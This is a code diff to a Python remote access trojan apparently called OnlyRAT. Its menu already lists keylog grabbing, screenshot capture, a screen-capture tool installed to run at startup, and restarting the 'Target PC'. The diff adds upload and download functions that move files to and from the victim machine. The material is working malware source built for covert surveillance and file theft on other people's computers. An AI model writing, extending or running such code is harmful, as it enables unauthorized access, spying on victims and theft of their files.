@@ -41,7 +41,9 @@ options_menu = """
             [2] - Grab Keylogs
             [3] - Install ScreenCapture
             [4] - Grab ScreenShots 
-            [5] - Restart Target PC
+            [5] - Upload File 
+            [6] - Download File
+            [7] - Restart Target PC
 
         [+] Options:
             [h] or [help] ----- Help Menu
@@ -190,6 +192,29 @@ def grab_screenshots(address, password, working, username):
     # confirmation
     print("\n[+] Screenshot downloaded to \"~/Downloads\"\n")
 
+# custom upload
+def upload(address, password, working):
+
+    # get upload file
+    print("\n[~] Enter file you wish to upload :")
+    upload_file = input(header)
+
+    # upload file
+    print("\n[*] Uploading...")
+    remote_upload(address, password, upload_file, working)
+    print(f"[+] Uploaded sucessfully to \"{working}\"\n")
+
+# custom download
+def download(address, password):
+
+    # get download path
+    print("\n[~] Enter path of file you wish to download :")
+    download_file = input(header)
+
+    # download file
+    print("\n[*] Downloading...")
+    remote_download(address, password, download_file)
+
 # update OnlyRAT
 def update():
 
@@ -303,15 +328,22 @@ def cli(arguments):
                 remote_command(ipv4, password, add_to_startup)
 
                 print("[+] ScreenCapture installed\n")
-
                 print("\n[!] Restart target computer to execute\n")
 
             # take screenshot option
             elif option == "4":
                 grab_screenshots(ipv4, password, working_direcory, target_username)
 
-            # restart target option
+            # custom upload
             elif option == "5":
+                upload(ipv4, password, working_direcory)
+
+            # custom download
+            elif option == "6":
+                download(ipv4, password)
+
+            # restart target option
+            elif option == "7":
                 remote_command(ipv4, password, "shutdown /r")
 
             # help menu
